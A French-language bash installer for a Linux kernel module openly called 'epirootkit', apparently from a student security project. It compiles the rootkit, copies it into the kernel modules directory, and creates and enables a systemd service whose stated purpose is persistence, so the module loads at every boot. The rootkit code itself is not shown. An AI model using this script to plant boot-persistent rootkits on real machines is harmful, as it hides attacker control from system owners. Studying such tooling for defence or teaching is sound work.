#!/bin/bash

# Couleurs pour les messages
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Fonction pour afficher les messages
print_message() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

# Vérifier si le script est exécuté en tant que root
if [ "$EUID" -ne 0 ]; then 
    print_error "Ce script doit être exécuté en tant que root"
    exit 1
fi

# Vérifier si le module est déjà chargé
if lsmod | grep -q "epirootkit"; then
    print_warning "Le module epirootkit est déjà chargé."
    read -p "Voulez-vous le décharger avant de continuer ? (y/n) " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        rmmod epirootkit
    else
        exit 1
    fi
fi

# Créer un point de sauvegarde
BACKUP_DIR="/var/lib/epirootkit/backup"
BACKUP_DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_PATH="$BACKUP_DIR/$BACKUP_DATE"

print_message "Création d'un point de sauvegarde..."
mkdir -p "$BACKUP_PATH"

# Sauvegarder les fichiers existants
if [ -f "/lib/modules/$(uname -r)/extra/epirootkit.ko" ]; then
    cp "/lib/modules/$(uname -r)/extra/epirootkit.ko" "$BACKUP_PATH/"
fi

if [ -f "/etc/systemd/system/epirootkit.service" ]; then
    cp "/etc/systemd/system/epirootkit.service" "$BACKUP_PATH/"
fi

# Compiler le rootkit
print_message "Compilation du rootkit..."
make clean
make

if [ ! -f "epirootkit.ko" ]; then
    print_error "La compilation a échoué"
    exit 1
fi

# Créer le répertoire pour le rootkit
print_message "Installation du module..."
mkdir -p "/lib/modules/$(uname -r)/extra"

# Copier le module
cp epirootkit.ko "/lib/modules/$(uname -r)/extra/"

# Mettre à jour les dépendances
print_message "Mise à jour des dépendances..."
depmod -a

# Créer le service systemd pour la persistance
print_message "Configuration du service systemd..."
cat > /etc/systemd/system/epirootkit.service << EOF
[Unit]
Description=EpiRootkit Service
After=network.target

[Service]
Type=oneshot
ExecStart=/sbin/modprobe epirootkit
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

# Activer et démarrer le service
print_message "Activation du service..."
systemctl daemon-reload
systemctl enable epirootkit.service
systemctl start epirootkit.service

# Vérifier si l'installation a réussi
if ! lsmod | grep -q "epirootkit"; then
    print_error "L'installation a échoué"
    print_message "Restauration de la sauvegarde..."
    if [ -f "$BACKUP_PATH/epirootkit.ko" ]; then
        cp "$BACKUP_PATH/epirootkit.ko" "/lib/modules/$(uname -r)/extra/"
    fi
    if [ -f "$BACKUP_PATH/epirootkit.service" ]; then
        cp "$BACKUP_PATH/epirootkit.service" "/etc/systemd/system/"
    fi
    systemctl daemon-reload
    exit 1
fi

print_message "EpiRootkit installé et activé avec succès"
print_message "Sauvegarde créée dans : $BACKUP_PATH" 